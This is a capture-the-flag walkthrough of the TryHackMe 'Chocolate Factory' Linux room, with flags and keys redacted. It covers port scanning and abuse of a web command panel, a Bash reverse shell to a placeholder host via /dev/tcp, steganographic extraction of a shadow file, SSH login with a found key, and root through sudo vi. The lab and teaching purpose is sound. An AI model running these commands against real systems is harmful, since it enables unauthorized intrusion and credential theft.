Chocolate Factory

TryHackMe · Linux · Easy. A playful room with a serious core: a command panel on the web, a secret hidden inside a photo, a reused key, and a sudo editor that leads to root.

Targets, keys, and flag values are from a shared practice environment and are redacted here. The point is the method, not the answers.

1. Recon

A full scan shows FTP, SSH, HTTP — and a long wall of open ports (roughly 100–125) that all return the same joke banner. That noise is deliberate; one of those banners quietly points at a web path worth remembering.

nmap -p- --min-rate 1000 -oA scans/all-ports TARGET
nmap -p 21,22,80,100-125 -sC -sV -oA scans/services TARGET
  • 21/tcp — vsFTPd with anonymous login allowed, offering a single image, gum_room.jpg.
  • 22/tcp — OpenSSH.
  • 80/tcp — Apache.
  • 100–125/tcp — decoy banners. One hints at a URL ending in key_rev_key.

2. A Command Panel on the Web

Content discovery against port 80 turns up a backup file and, more importantly, a page that runs commands.

dirsearch -u http://TARGET/
# /home.php        -> runs shell commands
# /index.php.bak   -> source backup, worth reading

The home.php panel executes whatever you type on the server. Use it to look around and read the first key the room hides in the web root.

ls -la
cat key_rev_key   # first key (redacted) — keep it, you will need it at the end

That key is a Fernet encryption key; the final flag is encrypted with it.

3. From Panel to Shell

A command panel is remote code execution, so trade it for a proper reverse shell. Start a listener, then run a Bash reverse shell through the panel.

# on your box
nc -lvnp 1337

# through the panel
bash -c 'bash -i >&/dev/tcp/YOUR_IP/1337 0>&1'

Enumerating the web files reveals a username (charlie) and a password in the application source. Hold onto both.

4. The Hidden File in the Photo

Pull the image from FTP and check it for embedded data. The passphrase is the password recovered a moment ago — secrets in this room are reused on purpose.

wget ftp://TARGET/gum_room.jpg      # anonymous
steghide info gum_room.jpg
steghide extract -sf gum_room.jpg    # enter the recovered password

The extracted file is Base64. Decoding it gives a copy of the system shadow file, including charlie's password hash — a second route to his account if you want to crack it.

base64 -d b64.txt > shadow.txt

5. SSH as charlie

In charlie's home directory there is a private key (named teleport). Use it to log in cleanly over SSH.

chmod 600 teleport
ssh -i teleport charlie@TARGET
cat user.txt    # flag{...}

6. Root

The first thing to check as any new user is what sudo allows.

sudo -l

charlie may run an editor as root without a password. An interactive editor that can run as root is a direct escape to a root shell (see GTFOBins for the exact syntax).

sudo vi -c ':!/bin/sh' /dev/null
# now root
id

The root flag is stored encrypted. Decrypt it with the Fernet key_rev_key recovered back in step 2, using a few lines of Python.

python3 -c "from cryptography.fernet import Fernet; \
print(Fernet(open('key_rev_key','rb').read().strip()).decrypt(open('root.txt','rb').read()))"

Why it worked

Every step reused something from the last: the web key unlocked the final flag, the web password unlocked the photo, and the photo and source handed over the account. The one privileged mistake — an editor runnable as root — finished it.

What To Take Away

  • A page that runs commands is remote code execution. Treat it as a shell immediately.
  • Check images for steganography, and try passwords you have already found as the passphrase.
  • Never leave private keys or source backups readable from the web.
  • Always run sudo -l. An editor allowed as root is root via GTFOBins.
